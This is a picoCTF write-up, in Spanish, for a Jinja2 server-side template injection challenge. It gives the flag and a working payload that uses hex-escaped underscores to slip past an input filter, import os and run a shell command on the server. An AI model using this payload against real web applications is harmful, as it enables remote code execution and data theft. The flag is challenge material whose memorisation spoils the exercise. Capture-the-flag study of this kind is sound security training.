#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:52480/)!

**Solución** 

picoCTF{sst1_f1lt3r_byp4ss_63b833cd}

**Notas adicionales**

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

```

- Este código, también conocido como _payload_, usa tácticas de ofuscación avanzadas en el motor de plantillas Jinja2 para "colarse" sin hacer saltar las alarmas. Se usa cuando te enfrentas a una página que refleja lo que escribes, pero que es "estricta" y limpia tu texto si detecta símbolos de programación comunes

**Referencias**

- https://onsecurity.io/article/server-side-template-injection-with-jinja2/